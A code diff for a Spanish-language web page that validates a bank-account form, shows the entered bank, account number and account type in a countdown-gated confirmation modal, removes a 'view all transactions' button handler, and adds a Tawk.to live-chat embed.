+    if (!selectedOptions.accountType) {
+      alert("Por favor, selecciona el tipo de cuenta.");
+      return false;
+    }
+    return true;
+  }
 
-    // "Ver todas" - puedes personalizar según tu flujo
-    const verTodasBtn = document.getElementById('verTodasBtn');
-    verTodasBtn.addEventListener('click', () => {
-      alert('Mostrando todas las transacciones...');
-    });
-  </script>
+  function showSummary() {
+    const fullBankName = bankSelect.value;
+    const fullAccountNumber = bankCodeInput.value + restAccountDigitsInput.value;
+
+    let resumen = `
+      <strong>Banco:</strong> ${fullBankName}<br/>
+      <strong>Número de Cuenta:</strong> ${fullAccountNumber}<br/>
+      <strong>Tipo de Cuenta:</strong> ${accountTypeSelect.value}<br/>
+    `;
+
+    summaryText.innerHTML = resumen;
+    openModal();
+  }
+
+  function openModal() {
+    modalOverlay.classList.add("active");
+
+    // Reiniciar la cuenta regresiva
+    clearInterval(countdownInterval);
+    secondsLeft = 10;
+    countdownMsg.textContent = `Disponible en ${secondsLeft}s`;
+    acceptBtn.disabled = true;
+
+    // Iniciar la cuenta regresiva
+    countdownInterval = setInterval(() => {
+      secondsLeft--;
+      countdownMsg.textContent = `Disponible en ${secondsLeft}s`;
+
+      if (secondsLeft <= 0) {
+        clearInterval(countdownInterval);
+        acceptBtn.disabled = false;
+        countdownMsg.textContent = ""; // Limpiar el mensaje cuando la cuenta regresiva termina
+      }
+    }, 1000);
+  }
+
+  function closeModal() {
+    modalOverlay.classList.remove("active");
+    clearInterval(countdownInterval);
+  }
+</script>
+
+<script>
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+    var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+  })();
+</script>
+
 </body>
 </html>
 
